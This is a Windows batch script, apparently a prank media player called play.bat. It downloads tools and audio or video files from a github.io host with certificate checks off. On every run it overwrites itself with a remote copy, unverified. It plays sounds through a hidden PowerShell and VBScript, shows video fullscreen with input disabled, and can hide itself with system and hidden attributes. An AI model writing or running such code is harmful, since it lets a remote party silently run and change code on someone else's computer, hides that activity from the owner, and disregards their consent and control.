@echo off
if not exist %temp%\331 (md %temp%\331) else (attrib -s -h -r %temp%\331)
pushd %temp%\331

set "_updusr=aritz331org"
set "_updrepo=play"
set "_updname=play.bat"

set "_dlurl=https://%_updusr%.github.io"
set "_curls=curl -kLOs"
set "_vbs=a.vbs"

if [%1]==[min] (
    set "_mp3=%~2.mp3"
    set "_mp4=%~3.mp4"
)

set "_min=start /min "" cmd /c"
set "_dum=dum2.bat"
set "_ping=ping localhost -n"
set "_hidden=powershell -nologo -NoP -W hidden"

call :update

:start
%_curls% "%_dlurl%/tools/{7z.exe,7z.dll,7-zip.dll,7-zip32.dll}"
if not [%1]==[min] (
    popd
    %_min% "%~dpnx0" min %*
    exit /b
)

:args
for %%i in (%*) do (
    if [%%i]==[/f] (
        shift
        set "fiel=%1"
        set "o=fiel"
        goto f
    )
    if [%%i]==[/v] (
        shift
        goto vid
    )
    if [%%i]==[/h] (
        shift
        attrib +s +h +r "%~dpnx0"
    )
    if [%%i]==[/u] (
        shift
        attrib -s -h -r "%~dpnx0"
    )
    if [%%i]==[/s] (
        taskkill /f /im wscript.exe
        exit /b
    )
)

goto play
exit /b

:update
curl -kLs "%_dlurl%/%_updrepo%/%_updname%" -o %_dum% || exit /b
fc "%~dpnx0" "%_dum%">nul || (goto doupdate)
exit /b

:doupdate
%_min% %_ping% 2^>nul ^& move "%_dum%" "%~dpnx0" ^& %_min% "%~0" min %*
exit /b

:play
%_curls% "%_dlurl%/mp3/%_mp3%"
set "fiel=%_mp3%"

:f
set "file=%fiel%"
(
  echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%file%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000
) > %_vbs%

%_min% %_hidden% wscript %_vbs% ^& %_ping% 2 ^>nul ^& del %_vbs%

if not "%o%"=="fiel" (del "%_mp4%")
exit /b

:vid
%_curls% "%_dlurl%/mp4/%_mp4%"
set "file=%~1"
%_curls% "%_dlurl%/tools/mpv.7z"
7z x mpv.7z -y
del mpv.7z
if not exist "%_mp4%" (
    %_curls% "%_dlurl%/mp4/%_mp4%"
    mpv "%_mp4%" --no-osc --no-input-default-bindings --no-taskbar-progress -fs
)
exit /b
